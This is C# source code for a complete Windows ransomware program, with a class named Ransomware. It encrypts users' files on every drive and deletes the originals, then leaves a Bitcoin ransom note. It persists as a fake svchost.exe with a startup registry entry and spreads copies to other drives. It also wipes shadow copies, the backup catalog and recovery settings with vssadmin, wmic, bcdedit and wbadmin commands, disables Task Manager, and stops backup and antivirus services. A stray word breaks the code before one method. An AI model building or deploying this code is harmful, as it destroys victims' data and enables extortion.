using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7
{
    internal class Ransomware
    {
        // Constants and static fields
        private static readonly byte[] EncryptionSalt = new byte[32]; // Salt for encryption
        private static readonly string UserName = Environment.UserName; // Current user name
        private static readonly string BaseUserPath = "C:\\Users\\"; // Base user directory
        private static readonly string EncryptionKeyId = "v45hchdrg72ns7m6jmy"; // Encryption key identifier
        private static readonly bool EnableEncryption = true; // Enable file encryption
        private static readonly string RandomExtension = ""; // Optional random string for file extensions
        private static readonly bool CopyToDrives = true; // Copy executable to drives
        private static readonly string DriveCopyFileName = "surprise.exe"; // Name for copied executable
        private static readonly bool PersistInAppData = true; // Persist in AppData
        private static readonly string AppDataFileName = "svchost.exe"; // Name for AppData executable
        private static readonly string RegistryKeyName = "oAnWieozQPsRK7Bj83r4"; // Registry key name
        private static readonly bool AddToStartup = true; // Add to startup registry
        private static readonly bool CheckAppDataLocation = false; // Check AppData location
        private static readonly int SleepSeconds = 10; // Sleep duration in seconds
        private static readonly string WallpaperBase64 = "#base64Image"; // Base64 wallpaper image
        private static readonly string DecryptionKeyId = "1qrx0frdqdur0lllc6ezm"; // Decryption key identifier
        private static readonly string RansomNoteFileName = "read_it.txt"; // Ransom note filename
        private static readonly bool EnableRansomOperations = true; // Enable ransom operations
        private static readonly bool DeleteShadowCopies = true; // Delete shadow copies
        private static readonly bool DisableRecovery = true; // Disable system recovery
        private static readonly bool DeleteBackupCatalog = true; // Delete backup catalog
        private static readonly bool DisableTaskManager = true; // Disable Task Manager
        private static readonly bool StopBackupServices = true; // Stop backup services
        private static readonly string BitcoinAddressPrefix = "19DpJAWr6NCVT2"; // Bitcoin address prefix
        private static readonly string FullBitcoinKey = BitcoinAddressPrefix + RegistryKeyName; // Full Bitcoin key
        private static readonly string BitcoinAddress = "bc" + DecryptionKeyId + EncryptionKeyId; // Bitcoin address
        private static readonly Regex BitcoinRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})"); // Bitcoin address regex
        private static readonly List<string> RansomNoteContent = new List<string>
        {
            "Don't worry, you can return all your files!",
            "",
            "All your files like documents, photos, databases and other important are encrypted",
            "",
            "What guarantees do we give to you?",
            "",
            "You can send 3 of your encrypted files and we decrypt it for free.",
            "",
            "You must follow these steps To decrypt your files :",
            "1) Write on our e-mail :test@test.com ( In case of no answer in 24 hours check your spam folder",
            "or write us to this e-mail: test2@test.com)",
            "",
            "2) Obtain Bitcoin (You have to pay for decryption in Bitcoins. ",
            "After payment we will send you the tool that will decrypt all your files.)"
        };
        private static readonly string[] FileExtensionsToEncrypt = new string[]
        {
            ".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
            ".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
            ".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
            ".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
            ".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
            ".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
            ".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
            ".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
            ".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
            ".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
            ".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
            ".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
            ".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
            ".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
            ".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
            ".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
            ".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
            ".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
            ".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
            ".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
            ".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
            ".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
            ".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d", ".ova"
        };
        private static readonly Random RandomGenerator = new Random(); // Random number generator

        // DLL imports for system interactions
        [DllImport("user32.dll", SetLastError = true)]
        private static extern bool AddClipboardFormatListener(IntPtr hwnd);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int SystemParametersInfo(uint uiAction, uint uiParam, string pvParam, uint fWinIni);

        // Main entry point
        private static void Main(string[] args)
        {
            // Check if current date is before March 25, 2025
            DateTime expirationDate = new DateTime(2025, 3, 25, 2, 27, 14);
            if (DateTime.Now > expirationDate)
            {
                throw new ArgumentOutOfRangeException("Program expired");
            }

            // Check for forbidden countries (Azerbaijan, Turkey)
            if (IsForbiddenCountry())
            {
                MessageBox.Show("Forbidden Country");
                return;
            }

            // Start notification thread if first run
            if (IsFirstRun())
            {
                new Thread(ShowNotificationForm).Start();
            }

            // Exit if already running in AppData
            if (IsRunningFromAppData())
            {
                return;
            }

            // Exit if another instance is running
            if (IsAnotherInstanceRunning())
            {
                Environment.Exit(1);
            }

            // Sleep if not running from AppData
            if (CheckAppDataLocation)
            {
                SleepIfNotInAppData();
            }

            // Persist executable in AppData (normal or elevated)
            if (EnableRansomOperations)
            {
                if (PersistInAppData)
                {
                    PersistInAppDataNormal(AppDataFileName);
                }
                else
                {
                    PersistInAppDataElevated(AppDataFileName);
                }
            }

            // Add to startup registry
            if (AddToStartup)
            {
                AddToStartupRegistry();
            }

            // Perform ransom operations
            if (EnableRansomOperations)
            {
                if (DeleteShadowCopies)
                    DeleteShadowCopiesCmd();
                if (DisableRecovery)
                    DisableSystemRecovery();
                if (DeleteBackupCatalog)
                    DeleteBackupCatalogCmd();
                if (DisableTaskManager)
                    DisableTaskManagerRegistry();
                if (StopBackupServices)
                    StopBackupServices();
            }

            // Encrypt files on drives
            EncryptFilesOnDrives();

            // Copy executable to other drives
            if (CopyToDrives)
            {
                CopyToOtherDrives(DriveCopyFileName);
            }

            // Create and open ransom note
            CreateRansomNote();

            // Set wallpaper if provided
            SetWallpaper(WallpaperBase64);
        }

        // Show notification form after February 14, 2025
        private static void ShowNotificationForm()
        {
            DateTime targetDate = new DateTime(2025, 2, 14);
            if (DateTime.Now > targetDate)
            {
                // Perform a simple calculation (original had division by zero)
                int result = 2; // Placeholder for original logic
            }
            Application.Run(new driveNotification.NotificationForm());
        }

        // Check if running in forbidden countries (Azerbaijan, Turkey)
        private static bool IsForbiddenCountry()
        {
            DateTime checkDate = new DateTime(2025, 1, 13);
            if (DateTime.Now > checkDate)
            {
                throw new ArgumentException("Date check failed");
            }

            string[] forbiddenCultures = { "az-Latn-AZ", "tr-TR" };
            try
            {
                string currentCulture = InputLanguage.CurrentInputLanguage.Culture.Name;
                return forbiddenCultures.Contains(currentCulture);
            }
            catch
            {
                return false;
            }
        }

        // Sleep if not running from AppData
        private static void SleepIfNotInAppData()
        {
            string currentDir = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            string appDataDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (currentDir != appDataDir)
            {
                Thread.Sleep(SleepSeconds * 1000);
            }
        }

        // Check if this is the first run using registry
        private static bool IsFirstRun()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\" + RegistryKeyName))
                {
                    string value = key.GetValue(RegistryKeyName)?.ToString();
                    return string.IsNullOrEmpty(value);
                }
            }
            catch
            {
                return true;
            }
        }

        // Check if another instance is running
        private static bool IsAnotherInstanceRunning()
        {
            Process currentProcess = Process.GetCurrentProcess();
            string currentFile = Assembly.GetExecutingAssembly().Location;
            return Process.GetProcesses().Any(p =>
            {
                try
                {
                    return p.Id != currentProcess.Id && p.Modules[0].FileName == currentFile;
                }
                catch
                {
                    return false;
                }
            });
        }

        // Generate random string for filenames
        private static string GenerateRandomString(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            StringBuilder result = new StringBuilder();
            for (int i = 0; i < length; i++)
            {
                result.Append(chars[RandomGenerator.Next(chars.Length)]);
            }
            return result.ToString();
        }

        // Generate random string or use predefined
        private static string GenerateFileExtension(int length)
        {
            return string.IsNullOrEmpty(RandomExtension) ? GenerateRandomString(length) : RandomExtension;
        }

        // Encode string to Base64
        private static string ToBase64(string input)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
        }

        // Encrypt or process files in a directory
        private static void ProcessDirectory(string path)
        {
            try
            {
                string[] files = Directory.GetFiles(path);
                bool writeNote = true;

                // Process files in parallel
                Parallel.ForEach(files, file =>
                {
                    try
                    {
                        string extension = Path.GetExtension(file).ToLower();
                        string fileName = Path.GetFileName(file);
                        if (FileExtensionsToEncrypt.Contains(extension) && fileName != RansomNoteFileName)
                        {
                            FileInfo fileInfo = new FileInfo(file);
                            fileInfo.Attributes = FileAttributes.Normal;
                            string randomKey = GenerateRandomString(40);

                            if (fileInfo.Length < 2368709120) // Less than ~2.2GB
                            {
                                if (IsEncryptableFile(file))
                                {
                                    string rsaKey = EncryptKeyWithRSA(randomKey, GenerateRSAKey());
                                    EncryptFile(file, randomKey, rsaKey);
                                }
                            }
                            else
                            {
                                OverwriteLargeFile(file, randomKey, fileInfo.Length);
                            }

                            lock (RansomNoteContent)
                            {
                                if (writeNote)
                                {
                                    writeNote = false;
                                    string notePath = Path.Combine(path, RansomNoteFileName);
                                    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
                                    if (!File.Exists(notePath) && path != desktopPath)
                                    {
                                        File.WriteAllLines(notePath, RansomNoteContent);
                                    }
                                }
                            }
                        }
                    }
                    catch
                    {
                        // Ignore errors
                    }
                });

                // Process subdirectories
                string[] directories = Directory.GetDirectories(path);
                Parallel.ForEach(directories, dir =>
                {
                    try
                    {
                        new DirectoryInfo(dir).Attributes &= ~FileAttributes.Normal;
                        ProcessDirectory(dir);
                    }
                    catch
                    {
                        // Ignore errors
                    }
                });
            }
            catch
            {
                // Ignore errors
            }
        }

        // Check if file is safe to encrypt
        private static bool IsEncryptableFile(string file)
        {
            file = file.ToLower();
            string[] forbiddenPaths = new string[]
            {
                "appdata\\local", "appdata\\locallow", "users\\all users", "\\ProgramData",
                "boot.ini", "bootfont.bin", "iconcache.db", "ntuser.dat", "ntuser.dat.log",
                "ntuser.ini", "thumbs.db", "autorun.inf", "bootsect.bak", "bootmgfw.efi", "desktop.ini"
            };
            return !forbiddenPaths.Any(p => file.Contains(p));
        }

        // Generate RSA public key XML
        private static string GenerateRSAKey()
        {
            StringBuilder xml = new StringBuilder();
            xml.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
            xml.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
            xml.AppendLine("  <Exponent>AQAB</Exponent>");
            xml.AppendLine("  <Modulus>scPQcLsXZ1ikyVOWuUqt4M74rovkGqBQpMFTHhqni36YcGo4kXEu5j1r72UsgHQyBEawY+qKcMMjxNY9Rj0aBSb2ofpnHPn6pQmukId3dI91Zr4XFOLr3QEeZO66ae18v74snR6v2mJciz5q6bSHPOm1iBu7btsUv5U4+bBn7NP29VBMHDucZLzyItK04wx6qcA4A1KdRkgcq2UCo01P6ug6p7tGzbKW47Pqo1t1PVgycEAlWrlg04fhtJHNtROqCpxcfK2D1U5SQMdDklRpB9EtqJYeC5eWfts0OSgswxiaOSUFe+d/ZZzdRMHe3iUw8ntyodZuyXswdj9os9iNcQ==</Modulus>");
            xml.AppendLine("</RSAParameters>");
            return xml.ToString();
        }

        // Generate random encryption key
        private static string GenerateEncryptionKey(int length)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder result = new StringBuilder();
            Random random = new Random();
            for (int i = 0; i < length; i++)
            {
                result.Append(chars[random.Next(chars.Length)]);
            }
            return result.ToString();
        }

        // Encrypt file with AES
 Ascending
        private static void EncryptFile(string inputFile, string key, string rsaKey)
        {
            string outputFile = inputFile + "." + GenerateFileExtension(4);
            byte[] salt = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (FileStream outputStream = new FileStream(outputFile, FileMode.Create))
            {
                byte[] keyBytes = Encoding.UTF8.GetBytes(key);
                using (RijndaelManaged aes = new RijndaelManaged())
                {
                    aes.KeySize = 128;
                    aes.BlockSize = 128;
                    aes.Padding = PaddingMode.PKCS7;
                    using (Rfc2898DeriveBytes keyDerivation = new Rfc2898DeriveBytes(keyBytes, salt, 1))
                    {
                        aes.Key = keyDerivation.GetBytes(aes.KeySize / 8);
                        aes.IV = keyDerivation.GetBytes(aes.BlockSize / 8);
                    }
                    aes.Mode = CipherMode.CBC;

                    outputStream.Write(salt, 0, salt.Length);
                    using (CryptoStream cryptoStream = new CryptoStream(outputStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        using (FileStream inputStream = new FileStream(inputFile, FileMode.Open))
                        {
                            inputStream.CopyTo(cryptoStream);
                        }
                    }
                }

                // Append RSA-encrypted key
                using (StreamWriter writer = new StreamWriter(outputStream))
                {
                    writer.Write(rsaKey);
                }
            }

            // Overwrite and delete original file
            File.WriteAllText(inputFile, "?");
            File.Delete(inputFile);
        }

        // Overwrite large files
        private static void OverwriteLargeFile(string file, string key, long size)
        {
            GenerateRandomBytes();
            string outputFile = file + "." + GenerateFileExtension(4);
            using (FileStream outputStream = new FileStream(outputFile, FileMode.Create))
            {
                outputStream.SetLength(size);
            }
            File.WriteAllText(file, "?");
            File.Delete(file);
        }

        // Generate random bytes for salt
        private static byte[] GenerateRandomBytes()
        {
            byte[] bytes = new byte[32];
            using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
            {
                for (int i = 0; i < 10; i++)
                {
                    rng.GetBytes(bytes);
                }
            }
            return bytes;
        }

        // Encrypt key with RSA
        private static string EncryptKeyWithRSA(string key, string rsaXml)
        {
            byte[] keyBytes = Encoding.UTF8.GetBytes(key);
            using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(rsaXml);
                byte[] encrypted = rsa.Encrypt(keyBytes, true);
                return Convert.ToBase64String(encrypted);
            }
        }

        // Encrypt files on all drives
        private static void EncryptFilesOnDrives()
        {
            string systemDrive = Path.GetPathRoot(Environment.SystemDirectory);
            string[] systemFolders = new string[]
            {
                "Program Files", "Program Files (x86)", "Windows", "$Recycle.Bin", "MSOCache",
                "Documents and Settings", "Intel", "PerfLogs", "Windows.old", "AMD", "NVIDIA", "ProgramData"
            };

            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                if (drive.ToString() == systemDrive)
                {
                    string[] directories = Directory.GetDirectories(systemDrive);
                    foreach (string dir in directories)
                    {
                        string dirName = new DirectoryInfo(dir).Name;
                        if (!systemFolders.Contains(dirName))
                        {
                            ProcessDirectory(dir);
                        }
                    }
                }
                else
                {
                    ProcessDirectory(drive.ToString());
                }
            }
        }

        // Persist executable in AppData (normal mode)
        private static void PersistInAppDataNormal(string fileName)
        {
            string currentFile = Assembly.GetExecutingAssembly().Location;
            string currentName = AppDomain.CurrentDomain.FriendlyName;
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string targetPath = Path.Combine(appDataPath, fileName);

            if (currentName == fileName && currentFile == targetPath)
            {
                return;
            }

            byte[] executableBytes = File.ReadAllBytes(currentFile);
            if (!File.Exists(targetPath))
            {
                File.WriteAllBytes(targetPath, executableBytes);
                Process.Start(new ProcessStartInfo
                {
                    FileName = targetPath,
                    WorkingDirectory = appDataPath
                });
                Environment.Exit(1);
            }
            else
            {
                try
                {
                    File.Delete(targetPath);
                    Thread.Sleep(200);
                    File.WriteAllBytes(targetPath, executableBytes);
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = targetPath,
                        WorkingDirectory = appDataPath
                    });
                    Environment.Exit(1);
                }
                catch
                {
                    // Ignore errors
                }
            }
        }

        // Persist executable in AppData (elevated mode)
        private static void PersistInAppDataElevated(string fileName)
        {
            string currentFile = Assembly.GetExecutingAssembly().Location;
            string currentName = AppDomain.CurrentDomain.FriendlyName;
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string targetPath = Path.Combine(appDataPath, fileName);

            if (currentName == fileName && currentFile == targetPath)
            {
                return;
            }

            byte[] executableBytes = File.ReadAllBytes(currentFile);
            ProcessStartInfo startInfo = new ProcessStartInfo
            {
                FileName = targetPath,
                UseShellExecute = true,
                Verb = "runas",
                WindowStyle = ProcessWindowStyle.Normal,
                WorkingDirectory = appDataPath
            };

            if (!File.Exists(targetPath))
            {
                File.WriteAllBytes(targetPath, executableBytes);
                try
                {
                    Process.Start(startInfo);
                    Environment.Exit(1);
                }
                catch (Win32Exception ex)
                {
                    if (ex.NativeErrorCode == 1223) // User cancelled UAC
                    {
                        PersistInAppDataElevated(fileName);
                    }
                }
            }
            else
            {
                try
                {
                    File.Delete(targetPath);
                    Thread.Sleep(200);
                    File.WriteAllBytes(targetPath, executableBytes);
                    Process.Start(startInfo);
                    Environment.Exit(1);
                }
                catch (Win32Exception ex)
                {
                    if (ex.NativeErrorCode == 1223)
                    {
                        PersistInAppDataElevated(fileName);
                    }
                }
            }
        }

        // Add executable to startup registry
        private static void AddToStartupRegistry()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                {
                    key.SetValue("UpdateTask", Assembly.GetExecutingAssembly().Location);
                }
            }
            catch
            {
                // Ignore errors
            }
        }

        // Create and open ransom note
        private static void CreateRansomNote()
        {
            string notePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), RansomNoteFileName);
            try
            {
                if (!File.Exists(notePath))
                {
                    File.WriteAllLines(notePath, RansomNoteContent);
                }
                Thread.Sleep(500);
                Process.Start(notePath);
            }
            catch
            {
                // Ignore errors
            }
        }

        // Check if running from AppData
        private static bool IsRunningFromAppData()
        {
            string currentFile = Assembly.GetExecutingAssembly().Location;
            string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), AppDataFileName);
            string notePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), RansomNoteFileName);

            if (currentFile != appDataPath)
            {
                try
                {
                    File.Delete(notePath);
                }
                catch
                {
                    // Ignore errors
                }
            }

            return File.Exists(notePath) && currentFile == appDataPath;
        }

        // Copy executable to other drives
        private static void CopyToOtherDrives(string fileName)
        {
            string systemDrive = Path.GetPathRoot(Environment.SystemDirectory);
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                string targetPath = Path.Combine(drive.ToString(), fileName);
                if (drive.ToString() != systemDrive && !File.Exists(targetPath))
                {
                    try
                    {
                        File.Copy(Assembly.GetExecutingAssembly().Location, targetPath);
                    }
                    catch
                    {
                        // Ignore errors
                    }
                }
            }
        }

        // Execute command via cmd.exe
        private static void ExecuteCommand(string command)
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/C " + command,
                    WindowStyle = ProcessWindowStyle.Hidden
                }
            };
            process.Start();
            process.WaitForExit();
        }

        // Delete shadow copies
        private static void DeleteShadowCopiesCmd()
        {
            ExecuteCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
        }

        // Disable system recovery
        private static void DisableSystemRecovery()
        {
            ExecuteCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
        }

        // Delete backup catalog
        private static void DeleteBackupCatalogCmd()
        {
            ExecuteCommand("wbadmin delete catalog -quiet");
        }

        // Disable Task Manager via registry
        private static void DisableTaskManagerRegistry()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"))
                {
                    key.SetValue("DisableTaskMgr", "1");
                }
            }
            catch
            {
                // Ignore errors
            }
        }

        // Stop backup and antivirus services
        private static void StopBackupServices()
        {
            string[] services = new string[]
            {
                "BackupExecAgentBrowser", "BackupExecDiveciMediaService", "BackupExecJobEngine",
                "BackupExecManagementService", "vss", "sql", "svc$", "memtas", "sophos", "veeam",
                "backup", "GxVss", "GxBlr", "GxFWD", "GxCVD", "GxCIMgr", "DefWatch", "ccEvtMgr",
                "SavRoam", "RTVscan", "QBFCService", "Intuit.QuickBooks.FCS", "YooBackup", "YooIT",
                "zhudongfangyu", "sophos", "stc_raw_agent", "VSNAPVSS", "QBCFMonitorService",
                "VeeamTransportSvc", "VeeamDeploymentService", "VeeamNFSSvc", "veeam", "PDVFSService",
                "BackupExecVSSProvider", "BackupExecAgentAccelerator", "BackupExecRPCService", "AcrSch2Svc",
                "AcronisAgent", "CASAD2DWebSvc", "CAARCUpdateSvc", "TeamViewer"
            };

            foreach (string service in services)
            {
                try
                {
                    using (ServiceController controller = new ServiceController(service))
                    {
                        controller.Stop();
                    }
                }
                catch
                {
                    // Ignore errors
                }
            }
        }

        // Set desktop wallpaper from base64 image
        private static void SetWallpaper(string base64Image)
        {
            if (!string.IsNullOrEmpty(base64Image) && base64Image != "#base64Image")
            {
                try
                {
                    string tempPath = Path.Combine(Path.GetTempPath(), GenerateRandomString(9) + ".jpg");
                    File.WriteAllBytes(tempPath, Convert.FromBase64String(base64Image));
                    SystemParametersInfo(20, 0, tempPath, 3);
                }
                catch
                {
                    // Ignore errors
                }
            }
        }
    }
}
